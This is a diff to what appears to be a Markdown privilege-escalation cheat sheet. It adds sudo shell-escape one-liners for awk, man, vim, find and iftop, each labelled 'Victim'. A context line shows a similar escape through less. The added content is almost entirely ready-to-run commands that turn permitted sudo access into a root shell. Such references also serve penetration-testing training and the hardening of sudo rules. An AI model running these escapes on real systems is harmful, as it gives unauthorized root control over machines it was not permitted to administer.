@@ -294,10 +294,46 @@ VISUAL="/bin/sh -c '/bin/sh'" sudo less /etc/profile
 v
 ```
 
+### **awk**
+
 **Victim**
 
 ```
-s
+sudo awk 'BEGIN {system("/bin/bash")}'
+```
+
+### **man**
+
+**Victim**
+
+```
+sudo man man 
+!bash
+```
+
+### **VIM**
+
+**Victim**
+
+```
+sudo vim -c ':!/bin/bash'
+```
+
+### **find**
+
+**Victim**
+
+```
+sudo find / etc/passwd -exec /bin/bash \;
+```
+
+### **iftop**
+
+**Victim**
+
+```
+iftop
+!/bin/sh
 ```
 
 ## Sudo - Environment Variables
